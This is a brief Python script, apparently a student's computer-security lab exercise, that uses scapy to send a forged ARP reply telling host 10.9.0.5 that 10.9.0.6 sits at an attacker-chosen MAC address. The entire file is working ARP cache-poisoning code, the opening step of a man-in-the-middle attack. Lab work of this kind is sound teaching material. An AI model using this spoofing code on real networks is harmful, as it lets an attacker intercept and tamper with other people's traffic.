#!/usr/bin/env python3

'''
	Name: Joshua Ludolf
	Class: CSCI 4321 - Computer Security
'''

from scapy.all import *

a = Ether(src='02:42:0a:09:00:69', dst='02:42:0a:09:00:05')
b = ARP(op=2, hwsrc='02:42:0a:09:00:69', psrc='10.9.0.6', hwdst='02:42:0a:09:00:05', pdst='10.9.0.5')

sendp(a/b)

